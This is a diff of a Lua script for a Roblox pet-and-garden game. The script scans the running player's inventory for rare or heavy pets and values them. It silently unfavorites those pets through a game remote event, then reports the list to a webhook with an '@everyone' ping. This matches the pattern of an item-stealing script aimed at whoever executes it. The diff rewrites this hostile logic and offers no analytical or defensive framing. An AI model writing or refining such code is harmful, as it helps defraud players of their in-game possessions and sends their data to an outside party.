@@ -48,19 +48,7 @@ end
 local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
 -- Remove plant-related constants and logic
 -- Rare pets and mutation keywords
--- Whitelisted pets (replace rarePets)
-local petWhitelist = {
-    'Red Fox',
-    'Raccoon',
-    'Dragonfly',
-    'Queen Bee',
-    'T-Rex',
-    'Fennec Fox',
-    'Butterfly',
-    'Disco Bee',
-    'Mimic Octopus',
-    'Kitsune'
-}
+local rarePets = {"Red Fox", "Raccoon", "Dragonfly", "Queen Bee", "T-Rex", "Fennec Fox", "Butterfly", "Disco Bee", "Mimic Octopus", "Kitsune", "Spinosaurus", "Triceratops", "Raptor"}
 local mutationKeywords = {"Ascended", "Inverted", "Rainbow", "Radiant", "IronSkin", "Golden", "Tiny", "Frozen", "Windy", "Mega", "Shiny", "Shocked"}
 
 -- Emoji map for pet types          
@@ -85,11 +73,14 @@ local function getPetEmoji(petName, weight)
     return petEmojis[petName] or "🦊"
 end
 
-local function isWhitelistedPet(petName)
-    for _, allowed in ipairs(petWhitelist) do
-        if string.find(string.lower(petName), string.lower(allowed), 1, true) then
+local function isRarePet(petName, weight)
+    for _, rare in ipairs(rarePets) do
+        if string.find(petName, rare, 1, true) then
             return true
         end
+    end
+    if weight and weight >= 25 then
+        return true
     end
     return false
 end
@@ -102,15 +93,8 @@ local function hasMutation(petName)
     end
     return false
 end
--- Helper to extract weight and age from pet name string
-local function extractWeightAndAge(name)
-    local weight = tonumber(name:match("%[(%d+%.?%d*) KG%]"))
-    local age = name:match("%[Age%s*(%d+)%]")
-    return weight, age
-end
 local totalValue = 0
 local itemsToSend = {}
-local seenPets = {}
 
 -- Debug function
 local function debugPrint(message)
@@ -418,47 +402,86 @@ local function SendMessage(sortedItems)
     return sendWebhook(data)
 end
 
--- Scan all pets in inventory, not just backpack
-local playerData = dataService and dataService.GetData and dataService:GetData()
-if playerData and playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
-    for petUUID, v14 in pairs(playerData.PetsData.PetInventory.Data) do
-        if v14 and v14.PetData and v14.PetType then
-            local itemName = v14.PetType
-            local weight = v14.PetData.BaseWeight or 0
-            local petAge = v14.PetData.Age ~= nil and tostring(v14.PetData.Age) or "N/A"
-            local displayName = string.format("%s [%.2f KG] [Age %s]", itemName, weight, petAge)
-            local value = calcPetValue(v14)
-            local isWhitelisted = isWhitelistedPet(itemName)
-            local isHeavy = weight and weight >= 25
-            if (isWhitelisted or isHeavy) and not seenPets[petUUID] then
-                totalValue = totalValue + value
-                table.insert(itemsToSend, {Tool = nil, Name = displayName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
-                seenPets[petUUID] = true
-                debugPrint("Added pet: " .. displayName .. " Value: " .. value .. " Weight: " .. tostring(weight) .. " Age: " .. tostring(petAge))
+-- Remove plant scanning logic from backpack scan, only process pets
+debugPrint("Scanning backpack for items...")
+local itemCount = 0
+
+for _, tool in ipairs(backpack:GetChildren()) do
+    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
+        if tool:GetAttribute("ItemType") == "Pet" then
+            local petUUID = tool:GetAttribute("PET_UUID")
+            if petUUID and dataService and dataService.GetData then
+                local playerData = dataService:GetData()
+                if playerData and playerData.PetsData and playerData.PetsData.PetInventory and playerData.PetsData.PetInventory.Data then
+                    local v14 = playerData.PetsData.PetInventory.Data[petUUID]
+                    if v14 then
+                        local toolName = tool.Name
+                        local itemName = toolName:match("^(.-) %[%d+%.?%d* KG%]") or toolName
+                        local weight = tonumber(toolName:match("%[(%d+%.?%d*) KG%]")) or 0
+                        local petAge = tonumber(toolName:match("%[Age%s*(%d+)%]")) or "N/A"
+                        -- Only include rare pets and their mutated forms
+                        if isRarePet(itemName, weight) then
+                            if tool:GetAttribute("Favorite") then
+                                local success = pcall(function()
+                                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
+                                end)
+                                if not success then
+                                    debugPrint("Failed to unfavorite pet")
+                                end
+                            end
+                            local value = calcPetValue(v14)
+                            totalValue = totalValue + value
+                            table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet", Age = petAge})
+                            debugPrint("Added pet: " .. itemName .. " Value: " .. value .. " Age: " .. tostring(petAge))
+                        end
+                    end
+                end
             end
         end
     end
 end
 
-debugPrint("Total items found: " .. #itemsToSend)
+debugPrint("Total items found: " .. itemCount)
 debugPrint("Items to send: " .. #itemsToSend)
 debugPrint("Total value: " .. totalValue)
 
 if #itemsToSend > 0 then
-    debugPrint("Processing pets to send...")
+    debugPrint("Processing items...")
+    
+    -- Sort items
     table.sort(itemsToSend, function(a, b)
-        return a.Value > b.Value
+        if a.Type ~= "Pet" and b.Type == "Pet" then
+            return true
+        elseif a.Type == "Pet" and b.Type ~= "Pet" then
+            return false
+        else
+            return a.Value < b.Value
+        end
     end)
+
+    local sentItems = {}
+    for i, v in ipairs(itemsToSend) do
+        sentItems[i] = v
+    end
+
+    table.sort(sentItems, function(a, b)
+        if a.Type == "Pet" and b.Type ~= "Pet" then
+            return true
+        elseif a.Type ~= "Pet" and b.Type == "Pet" then
+            return false
+        else
+            return a.Value > b.Value
+        end
+    end)
+
     local prefix = ""
     if ping == "Yes" then
         prefix = "--@everyone "
     end
-    SendJoinMessage(itemsToSend, prefix)
+
+    -- Remove followUser and waitForUserChat, just send notification after scan
+    SendJoinMessage(sentItems, prefix)
 else
-    debugPrint("No items found that meet the minimum value requirement")
-    debugPrint("Try lowering the min_value in the configuration")
-end 
-if #itemsToSend == 0 and #highKGPets == 0 then
     debugPrint("No items found that meet the minimum value requirement")
     debugPrint("Try lowering the min_value in the configuration")
 end 
